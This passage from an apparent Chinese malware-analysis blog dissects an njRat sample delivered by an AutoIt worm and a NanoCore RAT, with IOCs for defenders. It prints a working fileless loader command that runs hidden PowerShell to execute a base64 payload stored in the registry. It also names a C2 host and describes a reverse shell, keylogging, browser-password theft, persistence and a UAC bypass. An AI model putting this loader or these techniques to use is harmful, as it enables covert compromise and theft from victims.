title="Tr.exe"></a>Tr.exe</h3><h4 id="设置注册表"><a href="#设置注册表" class="headerlink" title="设置注册表"></a>设置注册表</h4><p><img src="https://i.loli.net/2020/02/13/aoe5MLEvDRjHu31.png" alt="image.png"></p><h4 id="运行powershell"><a href="#运行powershell" class="headerlink" title="运行powershell"></a>运行powershell</h4><p><code>C:\Windows\System32\cmd.exe /c start /min powershell -ExecutionPolicy Bypass -windowstyle hidden -noexit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software).Valuex)).EntryPoint.Invoke($Null,$Null)</code></p><p>从注册表获取base64编码后的值并执行.</p><h1 id="0x04-分析"><a href="#0x04-分析" class="headerlink" title="0x04 分析"></a>0x04 分析</h1><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><h3 id="反编译文件"><a href="#反编译文件" class="headerlink" title="反编译文件"></a>反编译文件</h3><h4 id="PE文件识别"><a href="#PE文件识别" class="headerlink" title="PE文件识别"></a>PE文件识别</h4><p><img src="https://i.loli.net/2020/02/13/TtJVWRO49uxcsag.png" alt="image.png"></p><p>使用<code>Autoit v3</code>脚本,进行编写.</p><p>Autoit v3: 类似 BASIC 脚本语言的免费软件,是一个支持复杂表达式, 自定义函数, 循环等的强大脚本软件.</p><p>使用<strong><em>AutoIt</em></strong>可以从<code>.au3</code>编译成<code>exe</code>文件.运行就不用使用编译器.</p><p>也可以被编译成<code>.a3x</code>,但需要有编译器运行环境.</p><h4 id="反编译与调试"><a href="#反编译与调试" class="headerlink" title="反编译与调试"></a>反编译与调试</h4><p>使用<code>Exe2Aut</code>进行反编译得到脚本文件.</p><p>使用<code>Autoit Debugger</code>进行代码调试.</p><h3 id="unload-Tr-exe"><a href="#unload-Tr-exe" class="headerlink" title="unload Tr.exe"></a>unload Tr.exe</h3><p><img src="https://i.loli.net/2020/02/14/sqpBIHKyePjgdJQ.png" alt="image.png"></p><p>可移动磁盘传播</p><p><img src="https://i.loli.net/2020/02/17/ExqRLsQ7Hk5XWvI.png" alt="image.png"></p><h3 id="Tr-exe-1"><a href="#Tr-exe-1" class="headerlink" title="Tr.exe"></a>Tr.exe</h3><p>使用<code>Exe2Aut</code>反编译后,会出现1.exe,也就是<code>Tr.exe</code></p><p><img src="https://i.loli.net/2020/02/14/QZhfcBi7DzMoWy5.png" alt="image-20200214163438163.png"></p><p>908行及之前都是<code>base64</code>编码后的数据</p><ol><li><p>给<code>regdata</code>赋值</p></li><li><p>将<code>regdata</code>写入到<code>HKCU\\Software\\Valuex</code>中,字符串类型</p></li><li><p>拼接字符串,<code>C:\Windows\System32\cmd.exe /c start /min powershell -ExecutionPolicy Bypass -windowstyle hidden -noexit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software).Valuex)).EntryPoint.Invoke($Null,$Null)</code></p><p><code>cmd</code> 最小化运行<code>powsershell</code></p><p><code>powershell</code>, 无提示运行,窗口隐藏 ,运行启动命令不退出,取得注册表值加载到内存中,跳转到<code>Entrypoint</code>处并运行.</p></li><li><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunAdobeMX 开机自启.</p></li></ol><h3 id="Powershell-exe"><a href="#Powershell-exe" class="headerlink" title="Powershell.exe"></a>Powershell.exe</h3><p>C#程序,MD5为<code>56c0630998c7b8af19a2d72f3315ef4c</code></p><p>是<code>njRat</code>家族的.</p><p><img src="https://i.loli.net/2020/02/14/PUiAhw8IoH3WtQX.png" alt="image.png"></p><p>使用<code>De4dot</code>脱壳</p><h4 id="密文解码"><a href="#密文解码" class="headerlink" title="密文解码"></a>密文解码</h4><p><img src="https://i.loli.net/2020/02/17/n7YEclDSJHrxvdU.png" alt="image.png"></p><h4 id="拷贝文件"><a href="#拷贝文件" class="headerlink" title="拷贝文件"></a>拷贝文件</h4><p>拷贝成功后,启动新进程并结束自身</p><p><img src="https://i.loli.net/2020/02/17/zByphW59mvUYRtX.png" alt="image.png"></p><h4 id="关闭区域检查-静默执行"><a href="#关闭区域检查-静默执行" class="headerlink" title="关闭区域检查,静默执行"></a>关闭区域检查,静默执行</h4><p><img src="https://i.loli.net/2020/02/17/OrFPqs5YoEx8UQz.png" alt="image.png"></p><h4 id="允许穿过防火墙"><a href="#允许穿过防火墙" class="headerlink" title="允许穿过防火墙"></a>允许穿过防火墙</h4><p><img src="https://i.loli.net/2020/02/17/GwSAneUKF9vOTyZ.png" alt="image.png"></p><h4 id="添加自启动注册表"><a href="#添加自启动注册表" class="headerlink" title="添加自启动注册表"></a>添加自启动注册表</h4><p>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</p><p>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</p><p>键值为互斥体名,键值为自身完整路径</p><p><img src="https://i.loli.net/2020/02/17/j3niVdLKZhRmAaC.png" alt="image.png"></p><h4 id="拷贝自身到开机自启文件夹"><a href="#拷贝自身到开机自启文件夹" class="headerlink" title="拷贝自身到开机自启文件夹"></a>拷贝自身到开机自启文件夹</h4><p>重命名为5cd8f17f4086744065eb0992a09e05a2.exe</p><p><img src="https://i.loli.net/2020/02/17/DPuZWQJ59HxOGMy.png" alt="image.png"></p><h4 id="客户端接受消息"><a href="#客户端接受消息" class="headerlink" title="客户端接受消息"></a>客户端接受消息</h4><p>会判断是否带有<code>[endof</code>]`字符.</p><p><img src="https://i.loli.net/2020/02/17/Bnh1LxeblQqrG2u.png" alt="image.png"></p><h4 id="自动重连"><a href="#自动重连" class="headerlink" title="自动重连"></a>自动重连</h4><p>water-boom.duckdns.org:1177</p><p><img src="https://i.loli.net/2020/02/17/ZuV7mdgaJUHi9tx.png" alt="image.png"></p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>获得信息后使用使用Base64编码,并使用<code>|&#39;|&#39;|</code>进行分割</p><h5 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h5><p><img src="https://i.loli.net/2020/02/17/bmN64WRz7u1wMvr.png" alt="image.png"></p><h5 id="机器名-用户名"><a href="#机器名-用户名" class="headerlink" title="机器名,用户名"></a>机器名,用户名</h5><p><img src="https://i.loli.net/2020/02/17/EhtCMYN61ZXvgP9.png" alt="image.png"></p><h5 id="完整操作系统名称"><a href="#完整操作系统名称" class="headerlink" title="完整操作系统名称"></a>完整操作系统名称</h5><p><img src="https://i.loli.net/2020/02/17/JWNfAvPpqXdQ13O.png" alt="image.png"></p><h5 id="系统版本"><a href="#系统版本" class="headerlink" title="系统版本"></a>系统版本</h5><p><img src="https://i.loli.net/2020/02/17/scjPutJzSTR4Llf.png" alt="image.png"></p><p>32位,64位</p><p><img src="https://i.loli.net/2020/02/17/HgdpT5vZhxEfwiz.png" alt="image.png"></p><h5 id="捕获驱动程序是否存在"><a href="#捕获驱动程序是否存在" class="headerlink" title="捕获驱动程序是否存在"></a>捕获驱动程序是否存在</h5><p><img src="https://i.loli.net/2020/02/17/l3CtQavAWUycFNK.png" alt="image.png"></p><h5 id="窗口信息"><a href="#窗口信息" class="headerlink" title="窗口信息"></a>窗口信息</h5><p><img src="https://i.loli.net/2020/02/17/RBrmD7dIPSGV2qz.png" alt="image.png"></p><h5 id="HKCU-Software-mutex"><a href="#HKCU-Software-mutex" class="headerlink" title="HKCU\Software\%mutex%"></a>HKCU\Software\%mutex%</h5><p>遍历获得值</p><p><img src="https://i.loli.net/2020/02/17/Ujm3PXVy6rSgIvR.png" alt="image.png"></p><h4 id="Critical-Process"><a href="#Critical-Process" class="headerlink" title="Critical Process"></a>Critical Process</h4><p>关闭程序导致BOSD</p><p><img src="https://i.loli.net/2020/02/17/pONR4h7rZlTMLF3.png" alt="image.png"></p><h4 id="清空缓存-减少内存"><a href="#清空缓存-减少内存" class="headerlink" title="清空缓存,减少内存"></a>清空缓存,减少内存</h4><p><img src="https://i.loli.net/2020/02/17/GsPo46pZWVzORKy.png" alt="image.png"></p><h4 id="插件功能"><a href="#插件功能" class="headerlink" title="插件功能"></a>插件功能</h4><h5 id="proc-“-”"><a href="#proc-“-”" class="headerlink" title="proc + “~”"></a>proc + “~”</h5><p>列举所有进程与模块信息</p><p><img src="https://i.loli.net/2020/02/17/vupoqiACQ2NtaEw.png" alt="image.png"></p><h5 id="proc-k"><a href="#proc-k" class="headerlink" title="proc + k"></a>proc + k</h5><p>根据PID结束进程</p><p><img src="https://i.loli.net/2020/02/17/afiL3WlD89zchCq.png" alt="image.png"></p><h5 id="proc-kd"><a href="#proc-kd" class="headerlink" title="proc + kd"></a>proc + kd</h5><p>结束进程,删除相应的文件</p><p><img src="https://i.loli.net/2020/02/17/5PyTH1kuUIRCoK7.png" alt="image.png"></p><h5 id="proc-re"><a href="#proc-re" class="headerlink" title="proc + re"></a>proc + re</h5><p>重启进程</p><p><img src="https://i.loli.net/2020/02/17/XMiO5zZFKSLaDtl.png" alt="image.png"></p><h5 id="rss"><a href="#rss" class="headerlink" title="rss"></a>rss</h5><p>重启反弹shell</p><p><img src="https://i.loli.net/2020/02/17/b8fPXZJSasN6qBU.png" alt="image.png"></p><h5 id="rsc"><a href="#rsc" class="headerlink" title="rsc"></a>rsc</h5><p>关闭反弹shell</p><p><img src="https://i.loli.net/2020/02/17/axiLWjI4UskKZEe.png" alt="image.png"></p><h5 id="rs"><a href="#rs" class="headerlink" title="rs"></a>rs</h5><p>后门shell输入</p><p><img src="https://i.loli.net/2020/02/17/nIt8ldPKE4Dzfch.png" alt="image.png"></p><h5 id="kl"><a href="#kl" class="headerlink" title="kl"></a>kl</h5><p>键盘记录器</p><h6 id="读取日志"><a href="#读取日志" class="headerlink" title="读取日志"></a>读取日志</h6><p><img src="https://i.loli.net/2020/02/17/wiuAKjSVHJe4tqL.png" alt="image.png"></p><h6 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h6><p>通过获取键值与键盘状态,记录.</p><p><img src="https://i.loli.net/2020/02/17/uSoKfwiE3hjbqaM.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/17/akFnox3BwRTYszj.png" alt="image.png"></p><h5 id="inf-vn-与-inf"><a href="#inf-vn-与-inf" class="headerlink" title="inf vn 与 inf"></a>inf vn 与 inf</h5><p>发送卷列标序号和受害者id给C&amp;C</p><p><img src="https://i.loli.net/2020/02/17/4lSvZdtzrx8iThm.png" alt="image.png"></p><h5 id="prof-“-”"><a href="#prof-“-”" class="headerlink" title="prof + “~”"></a>prof + “~”</h5><p>添加注册表值到 <code>HKCU\\Software\\5cd8f17f4086744065eb0992a09e05a2</code></p><h5 id="prof-”-”"><a href="#prof-”-”" class="headerlink" title="prof +”!”"></a>prof +”!”</h5><p>读取<code>HKCU\\Software\\5cd8f17f4086744065eb0992a09e05a2</code>的值</p><h5 id="prof-“-”-1"><a href="#prof-“-”-1" class="headerlink" title="prof + “@”"></a>prof + “@”</h5><p>删除<code>HKCU\\Software\\5cd8f17f4086744065eb0992a09e05a2</code>的值</p><p><img src="https://i.loli.net/2020/02/17/aBsFP3JEuwymN4e.png" alt="image.png"></p><h5 id="rn"><a href="#rn" class="headerlink" title="rn"></a>rn</h5><p>下载并执行文件</p><p><img src="https://i.loli.net/2020/02/17/xheXJ7Udg2uHGOr.png" alt="image.png"></p><h5 id="inv-amp-ret"><a href="#inv-amp-ret" class="headerlink" title="inv &amp; ret"></a>inv &amp; ret</h5><p>获得浏览器密码并发送给C&amp;C</p><h5 id="CAP"><a href="#CAP" class="headerlink" title="CAP"></a>CAP</h5><p>屏幕截图</p><p><img src="https://i.loli.net/2020/02/17/cYuzhwy53sKPMTG.png" alt="image.png"></p><h5 id="un-“-”"><a href="#un-“-”" class="headerlink" title="un + “~”"></a>un + “~”</h5><p>删除所有木马创建的注册表值,文件,防火墙规则.</p><p><img src="https://i.loli.net/2020/02/17/Kmtc4EbTA7HqMpx.png" alt="image.png"></p><h5 id="un-“-”-1"><a href="#un-“-”-1" class="headerlink" title="un + “!”"></a>un + “!”</h5><p>不为critical process</p><p>杀死后门进程</p><p><img src="https://i.loli.net/2020/02/17/gYuIKawsW4DX8il.png" alt="image.png"></p><h5 id="un-”-”"><a href="#un-”-”" class="headerlink" title="un +”@”"></a>un +”@”</h5><p>重启后门进程</p><p><img src="https://i.loli.net/2020/02/17/xgjlD1sZ6YNSvId.png" alt="image.png"></p><h5 id="up"><a href="#up" class="headerlink" title="up"></a>up</h5><p>从远程服务器下载文件并执行</p><p><img src="https://i.loli.net/2020/02/17/5dC6YxoeZiTkAy9.png" alt="image.png"></p><h5 id="RG-“-”"><a href="#RG-“-”" class="headerlink" title="RG + “~”"></a>RG + “~”</h5><p>列举特定的所有键值</p><h5 id="RG-“-”-1"><a href="#RG-“-”-1" class="headerlink" title="RG + “!”"></a>RG + “!”</h5><p>设定特定的键值</p><h5 id="RG-”-”"><a href="#RG-”-”" class="headerlink" title="RG +”@”"></a>RG +”@”</h5><p>删除特定的键值</p><h5 id="RG-“-”-2"><a href="#RG-“-”-2" class="headerlink" title="RG + “#”"></a>RG + “#”</h5><p>创建特定的键</p><h5 id="RG-“-”-3"><a href="#RG-“-”-3" class="headerlink" title="RG + “$”"></a>RG + “$”</h5><p>删除子键树</p><p><img src="https://i.loli.net/2020/02/17/gsaeY6NHbMEBPRl.png" alt="image.png"></p><h1 id="0x05-IOC"><a href="#0x05-IOC" class="headerlink" title="0x05 IOC"></a>0x05 IOC</h1><p>SHA-256: </p><p>c46a631f0bc82d8c2d46e9d8634cc50242987fa7749cac097439298d1d0c1d6e</p><p>25bc108a683d25a77efcac89b45f0478d9ddd281a9a2fb1f55fc6992a93aa830</p><p>8dbe3fc1131346a2162d940d2b351c060282c9ae93351327535b5b19a394883f</p><p>url:</p><p>water-boom.duckdns.org</p><h1 id="0x06-reference"><a href="#0x06-reference" class="headerlink" title="0x06 reference"></a>0x06 reference</h1><p><a href="https://www.jb51.net/shouce/autoit3/" target="_blank" rel="noopener">https://www.jb51.net/shouce/autoit3/</a></p><p><a href="http://bbs.anjian.com/showtopic-562218-1.aspx" target="_blank" rel="noopener">http://bbs.anjian.com/showtopic-562218-1.aspx</a></p><p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/autoit-compiled-worm-affecting-removable-media-delivers-fileless-version-of-bladabindi-njrat-backdoor/" target="_blank" rel="noopener">https://blog.trendmicro.com/trendlabs-security-intelligence/autoit-compiled-worm-affecting-removable-media-delivers-fileless-version-of-bladabindi-njrat-backdoor/</a></p><p>BOSD: <a href="https://zhuanlan.zhihu.com/p/40895012" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/40895012</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-样本信息&quot;&gt;&lt;a href=&quot;#0x01-样本信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 样本信息&quot;&gt;&lt;/a&gt;0x01 样本信息&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;样本名称: 62c01f&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;样本大小:  1178394字节&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;家族: njRat&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;版本: 0.6.4&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;MD5:  62c01f1b2ac0a7bab6c3b50fd51e6a36&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-1: cfc301a04b9a4ffeb0dc4578c1998a4eb4754f7b&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SHA-256: c46a631f0bc82d8c2d46e9d8634cc50242987fa7749cac097439298d1d0c1d6e&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;idb与样本地址:  &lt;a href=&quot;https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/2020-02-17-njRat&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="样本分析" scheme="http://blog.dgmddw.xyz/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="木马" scheme="http://blog.dgmddw.xyz/tags/%E6%9C%A8%E9%A9%AC/"/>
    
      <category term="C#" scheme="http://blog.dgmddw.xyz/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>nanocore木马分析</title>
    <link href="http://blog.dgmddw.xyz/2020/02/11/2020-02-11-nanocore%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>http://blog.dgmddw.xyz/2020/02/11/2020-02-11-nanocore木马分析/</id>
    <published>2020-02-10T16:00:00.000Z</published>
    <updated>2020-03-07T13:11:28.400Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="0x01-样本信息"><a href="#0x01-样本信息" class="headerlink" title="0x01 样本信息"></a>0x01 样本信息</h1><ul><li><p>样本名称: 31d4e0f1de4b81288aacf66d12f6d453</p></li><li><p>版本: 1.2.2.0</p></li><li><p>生成时间: 2017-06-13 7:30:11</p></li><li><p>样本大小:  207,360 字节</p></li><li><p>MD5:  31d4e0f1de4b81288aacf66d12f6d453</p></li><li><p>SHA-1: 865147146cea04c789e79404c5abd9a6e6254b9e</p></li><li><p>SHA-256: 5b2ffc4556a696bde5ecf74ea6ed809fc97edad58a24ed97a6dfc6a28e048b50</p></li><li><p>家族: nanocore</p></li><li><p>idb与样本地址:  <a href="https://github.com/Xuwei98/malware-analysis-idb/tree/master/Trojan/2020-02-11-nanocore" target="_blank" rel="noopener">github</a></p><a id="more"></a></li></ul><h1 id="0x02-分析环境"><a href="#0x02-分析环境" class="headerlink" title="0x02 分析环境"></a>0x02 分析环境</h1><ul><li>win10 x64 pro</li><li>VMware Workstaion 15</li></ul><h1 id="0x03-病毒行为"><a href="#0x03-病毒行为" class="headerlink" title="0x03 病毒行为"></a>0x03 病毒行为</h1><h2 id="释放文件"><a href="#释放文件" class="headerlink" title="释放文件"></a>释放文件</h2><p>可能会出现的文件</p><p>%exepath%\client.log</p><p>%AppData%\{guid}\UPNP Service\upnpsv.exe</p><p>C:\Program Files (x86)\UPNP Service\upnpsv.exe</p><p>%AppData%\{guid}\run.dat</p><p>%AppData%\{guid}\catalog.dat</p><p>%AppData%\{guid}\storage.dat</p><h2 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h2><p>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</p><h1 id="0x04-分析"><a href="#0x04-分析" class="headerlink" title="0x04 分析"></a>0x04 分析</h1><h2 id="简易行为分析"><a href="#简易行为分析" class="headerlink" title="简易行为分析"></a>简易行为分析</h2><h3 id="网络连接"><a href="#网络连接" class="headerlink" title="网络连接"></a>网络连接</h3><p>存在对大量未知IP的connect,可能是C&amp;C服务器地址.(图片未涵盖所有地址)</p><p>对<code>8.8.8.8</code>或者<code></code>8.8.4.4`发出请求,,收到消息后,会去尝试连接C&amp;C服务器.</p><p><img src="https://i.loli.net/2020/02/07/xod6IlXGHTNPJ8M.png" alt="image.png"></p><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><p>%AppData%\{guid}\run.dat</p><p><img src="https://i.loli.net/2020/02/07/PaqYzL4tFTc9rX5.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/07/I4SQui9hmTo3Xcf.png" alt="image.png"></p><p>%AppData%\{guid}\Logs\%UserName%</p><p><img src="https://i.loli.net/2020/02/07/8ur7epVM1RhWwBq.png" alt="image.png"></p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><h3 id="Main函数"><a href="#Main函数" class="headerlink" title="Main函数"></a>Main函数</h3><p>Main函数通过<code>Activator.CreateInstance&lt;T&gt;()</code>创建无参数<code>ClientLoaderForm</code>实例`,进行木马程序本体执行.<img src="https://i.loli.net/2020/02/07/tnVZqH9kXIsUK6e.png" alt="image.png"></p><h3 id="ClientLoaderForm构造函数"><a href="#ClientLoaderForm构造函数" class="headerlink" title="ClientLoaderForm构造函数"></a><code>ClientLoaderForm</code>构造函数</h3><p>进行事件注册和样式初始化</p><p><img src="https://i.loli.net/2020/02/07/21abeS35vjLWYcf.png" alt="image.png"></p><h3 id="Class8-load-reource"><a href="#Class8-load-reource" class="headerlink" title="Class8.load_reource()"></a>Class8.load_reource()</h3><p><img src="https://i.loli.net/2020/02/07/NFoMDPekJvTyRcA.png" alt="image.png"></p><p>动态加载所需函数,载入资源到内存表中</p><p><img src="https://i.loli.net/2020/02/07/O6eAYoaMcnQSkRs.png" alt="image.png"></p><h3 id="Class9-ImportFunc"><a href="#Class9-ImportFunc" class="headerlink" title="Class9_ImportFunc"></a>Class9_ImportFunc</h3><p>动态加载函数细节概览</p><p><img src="https://i.loli.net/2020/02/07/Jgiol7QdMy8uV3D.png" alt="image.png"></p><h3 id="资源表数据块处理"><a href="#资源表数据块处理" class="headerlink" title="资源表数据块处理"></a>资源表数据块处理</h3><p>通过一步步读取资源表数据,获取<code>GUID</code>,生成DES密钥对象.最后使用DES对剩余数据进行解密,采用<code>Deflate</code>进行解压缩,使用<code>while+switch_case</code>结构进行明文数据获取.</p><p><img src="https://i.loli.net/2020/02/10/UQMkzoYjB62JfGp.png" alt="image.png"></p><p>得到以下数据:共0x44条.其中第三条与第七条都为pe文件.<code>MD5</code>分别为</p><p><code>bdc8945f1d799c845408522e372d1dbd</code>,<code>9c8242440c47a4f1ce2e47df3c3ddd28</code>.其他hash值放ioc了.从下面字符串得知所需参数和相关功能,以及创建时间等信息.</p><p><img src="https://i.loli.net/2020/02/10/hAQL5IpWMSOglYv.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/10/O1mFHdQAvilzG9T.png" alt="image.png"></p><h4 id="将信息装入字典中"><a href="#将信息装入字典中" class="headerlink" title="将信息装入字典中"></a>将信息装入字典中</h4><p><img src="https://i.loli.net/2020/02/10/xqb74KUmkYOMLfJ.png" alt="image.png"></p><p>将第一个子pe文件存入到<code>Class8中</code>.<code>byte_0</code>为MD5值,<code>byte_1</code>为第一个子pe文件</p><p><img src="https://i.loli.net/2020/02/10/qwJkxi9vbtGgTOo.png" alt="image.png"></p><p><code>byte_0</code>为MD5值,<code>byte_1</code>为第二个pe文件.</p><p><img src="https://i.loli.net/2020/02/10/JuvwbBdnXfCPGzI.png" alt="image.png"></p><h3 id="Debug模式"><a href="#Debug模式" class="headerlink" title="Debug模式"></a>Debug模式</h3><p>开启debug模式,就会创建新cmd窗口与同文件夹下的client.log</p><p><img src="https://i.loli.net/2020/02/11/Ki3ZNnWFa2IyqzP.png" alt="image.png"></p><h4 id="client-log"><a href="#client-log" class="headerlink" title="client.log"></a>client.log</h4><p><img src="https://i.loli.net/2020/02/10/8FDwSA5YXf6TUeL.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/10/l8b6VsvDrOqJ4Mc.png" alt="image.png"></p><h3 id="创建互斥量"><a href="#创建互斥量" class="headerlink" title="创建互斥量"></a>创建互斥量</h3><p>创建互斥量,确保进程单一执行</p><p><img src="https://i.loli.net/2020/02/11/xRl9G2WLyNzZw5I.png" alt="image.png"></p><h3 id="创建被控标识文件夹"><a href="#创建被控标识文件夹" class="headerlink" title="创建被控标识文件夹"></a>创建被控标识文件夹</h3><p>获取唯一id,判断当前权限,判断当前系统版本,获取明文字符串</p><p><img src="https://i.loli.net/2020/02/11/VAXCT9ko4QaSvJR.png" alt="image.png"></p><h3 id="字符串初始化"><a href="#字符串初始化" class="headerlink" title="字符串初始化"></a>字符串初始化</h3><p><img src="https://i.loli.net/2020/02/11/hkzKWafmt2FuLwA.png" alt="image.png"></p><h3 id="日志写入"><a href="#日志写入" class="headerlink" title="日志写入"></a>日志写入</h3><p><img src="https://i.loli.net/2020/02/11/w3cUGuXCBabmAq1.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/10/8FDwSA5YXf6TUeL.png" alt="image.png"></p><h3 id="自启动注册"><a href="#自启动注册" class="headerlink" title="自启动注册"></a>自启动注册</h3><p>复制自身到<code>&quot;%appdata%\{guid}\\UPNP Service\&quot;</code>,并重命名为<code>upnpsv.exe</code></p><p>添加进注册表</p><p><img src="https://i.loli.net/2020/02/11/ZMhk7YjwAQpvesC.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/02/10/73xtjniPT8qQ1V5.png" alt="image.png"></p><h3 id="ByPassUAC"><a href="#ByPassUAC" class="headerlink" title="ByPassUAC"></a>ByPassUAC</h3><h4 id="管理员权限"><a href="#管理员权限" class="headerlink" title="管理员权限"></a>管理员权限</h4><p>管理员权限</p><p><code>schtasks.exe” /create /f /tn “UPNP Service” /xml %TempFileName%</code></p><p>创建计划任务,实现高权限长期运行</p><p><img src="https://i.loli.net/2020/02/11/9oy1NxEspWvePFR.png" alt="image.png"></p><h4 id="非管理员权限"><a href="#非管理员权限" class="headerlink" title="非管理员权限"></a>非管理员权限</h4><p>使用<code>schtasks.exe</code>任务计划程序高权限程序启动木马任务,绕过UAC</p><p><img src="https://i.loli.net/2020/02/11/iJBsEuGWUXzQR6t.png" alt="image.png"></p><h4 id="ClearZoneIdentifier"><a href="#ClearZoneIdentifier" class="headerlink" title="ClearZoneIdentifier"></a>ClearZoneIdentifier</h4><p><img src="https://i.loli.net/2020/02/11/Z7y3MJAKWBt4QV8.png" alt="image.png"></p><h3 id="操作权限提升"><a href="#操作权限提升" class="headerlink" title="操作权限提升"></a>操作权限提升</h3><p><code>-verv runas</code>管理员权限运行</p><p><img src="https://i.loli.net/2020/02/11/gcVG5rAFPLKQ1Be.png" alt="image.png"></p><h3 id="ClearAccessControlEntries"><a href="#ClearAccessControlEntries" class="headerlink" title="ClearAccessControlEntries"></a>ClearAccessControlEntries</h3><p>清楚访问控制 </p><p><img src="https://i.loli.net/2020/02/11/tzFG4vTh6mSUk5O.png" alt="image.png"></p><h3 id="结束指定进程导致BSOD"><a href="#结束指定进程导致BSOD" class="headerlink" title="结束指定进程导致BSOD"></a>结束指定进程导致BSOD</h3><p>第三个参数ProcessInformation，设置为TRUE时，表示将当前进程标记为critical process；设置为FALSE时，当前进程不是critical process</p><p><img src="https://i.loli.net/2020/02/11/gODmWn84MuYEakc.png" alt="image.png"></p><h3 id="ShowInstallationDialog"><a href="#ShowInstallationDialog" class="headerlink" title="ShowInstallationDialog"></a>ShowInstallationDialog</h3><p>显示安装窗口</p><p><img src="https://i.loli.net/2020/02/11/ygRVlpmAia4LkXY.png" alt="image.png"></p><h3 id="PreventSystemSleep-防止休眠"><a href="#PreventSystemSleep-防止休眠" class="headerlink" title="PreventSystemSleep 防止休眠"></a>PreventSystemSleep 防止休眠</h3><p><img src="https://i.loli.net/2020/02/11/9Vv1E3ONqdk8cLT.png" alt="image.png"></p><h3 id="加载插件目录"><a href="#加载插件目录" class="headerlink" title="加载插件目录"></a>加载插件目录</h3><p><img src="https://i.loli.net/2020/02/11/OurjJvcS5K3B4Te.png" alt="image.png"></p><h3 id="加载缓存插件"><a href="#加载缓存插件" class="headerlink" title="加载缓存插件"></a>加载缓存插件</h3><p>通过<code>storage.dat</code>加载</p><p><img src="https://i.loli.net/2020/02/11/FzU4BM5KJZH8eN7.png" alt="image.png"></p><h3 id="读取设置信息"><a href="#读取设置信息" class="headerlink" title="读取设置信息"></a>读取设置信息</h3><p><img src="https://i.loli.net/2020/02/11/GylA6Hv9o7QZ4hC.png" alt="image.png"></p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>机器GUID,被控时间,权限,系统版本,文件名</p><p><img src="https://i.loli.net/2020/02/10/tpF3bdHSE4BoVum.png" alt="image.png"></p><h4 id="setting-bin"><a href="#setting-bin" class="headerlink" title="setting.bin"></a>setting.bin</h4><p><img src="https://i.loli.net/2020/02/11/yvTaZeS1qukKIcB.png" alt="image.png"></p><h3 id="Initializing-cached-plugins-加载DLL"><a href="#Initializing-cached-plugins-加载DLL" class="headerlink" title="Initializing cached plugins.  加载DLL"></a>Initializing cached plugins.  加载DLL</h3><p>获取信息,通过红色函数加载dll,实现插件利用</p><p><img src="https://i.loli.net/2020/02/11/Ot5SPY1hEIeULFo.png" alt="image.png"></p><h4 id="DLL载入"><a href="#DLL载入" class="headerlink" title="DLL载入"></a>DLL载入</h4><p><img src="https://i.loli.net/2020/02/11/kfHRvXQTDbdFzgi.png" alt="image.png"></p><h4 id="插件获取"><a href="#插件获取" class="headerlink" title="插件获取"></a>插件获取</h4><p><img src="https://i.loli.net/2020/02/11/GrSFQsKiLxtMjBv.png" alt="image.png"></p><h3 id="获取C-amp-C地址"><a href="#获取C-amp-C地址" class="headerlink" title="获取C&amp;C地址"></a>获取C&amp;C地址</h3><p>通过使用dll内置函数进行</p><p><img src="https://i.loli.net/2020/02/11/pBUsTFX3hHgRoel.png" alt="image.png"></p><p>调试日志信息</p><p><img src="C:\Users\awei_\AppData\Roaming\Typora\typora-user-images\image-20200211120200329.png" alt="image-20200211120200329"></p><h3 id="初始化DNS等"><a href="#初始化DNS等" class="headerlink" title="初始化DNS等"></a>初始化DNS等</h3><p>管道相关函数,连接处理函数,插件函数等等.</p><p><img src="https://i.loli.net/2020/02/11/5G8cW7Jqf1dbLBE.png" alt="image.png"></p><h3 id="连接函数"><a href="#连接函数" class="headerlink" title="连接函数"></a>连接函数</h3><p><img src="https://i.loli.net/2020/02/11/XuxjTGJoci1s5wW.png" alt="image.png"></p><p>日志一览</p><p><img 